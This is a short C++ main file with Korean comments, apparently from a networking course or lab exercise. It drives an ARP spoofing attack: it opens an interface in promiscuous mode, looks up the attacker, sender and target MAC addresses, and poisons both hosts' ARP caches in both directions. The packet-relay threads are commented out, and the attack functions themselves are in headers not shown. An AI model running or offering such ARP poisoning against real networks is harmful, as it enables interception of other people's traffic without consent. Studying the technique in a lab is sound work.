#include <pcap.h>           // pcap 관련 함수들
#include <stdio.h>          
#include <stdlib.h>         // 메모리 할당 및 프로세스 제어 함수
#include <string.h>         // 문자열 관련 함수
#include <thread>           // C++ 표준 스레드 라이브러리 (std::thread 사용)
#include <iostream>			// std::cout


#include "utils.h"
#include "extract.h"
#include "attack.h"

int main(int argc, char* argv[]) {
	
	// 사용자가 입력한 명령어 검증
	if (argcValidate(argc) != 0) {
		exit(EXIT_FAILURE);  // Exit if validation fails
	}
	if (argvValidate(argv) != 0) {
		exit(EXIT_FAILURE);  // Exit if validation fails
	}
	
	// 사용자가 입력한 인터페이스
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE]; //오류메시지를 저장하기 위한 버퍼

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 네트워크 인터페이스 열고 핸들러를 반환(1:promiscuous, 1:1m/s)
	
	// 핸들러 검증
	handlerValidate(handle, dev, errbuf);
	
	// 자신의 맥주소(Attacker) 추출
	char * my_mac = getAttackerMac(argv[1]);
	printf("My MAC: %s\n", my_mac);
	
	// 자신의 IP주소(Attacker) 추출
	char * my_ip = getAttackerIP(argv[1]);
	printf("My IP: %s\n", my_ip);


	// Sender Mac주소 출력
    Mac sender_mac = sendArp(handle, my_mac, my_ip, argv[2]);
	std::cout << "Sender MAC: ";
	sender_mac.printMac();

	//Target Mac주소 출력
	Mac target_mac = sendArp(handle, my_mac, my_ip, argv[3]);
	std::cout << "Target MAC: ";
	target_mac.printMac();
		
	arpAttack(handle, Mac(my_mac),sender_mac, argv[2], argv[3]); //sender: A, target: B
	arpAttack(handle, Mac(my_mac), target_mac, argv[4], argv[5]);//semder: B, target: A

	
	//std::thread relay_thread(packetRelay, handle, Mac(my_mac), target_mac, sender_mac, argv[i], argv[i+1]);
    //std::thread recover_thread(recover_check, handle, Mac(my_mac), target_mac, sender_mac, argv[i], argv[i+1]);
		
	//relay_thread.join();
	// recover_thread.join();

    free(my_mac);
	pcap_close(handle);
}

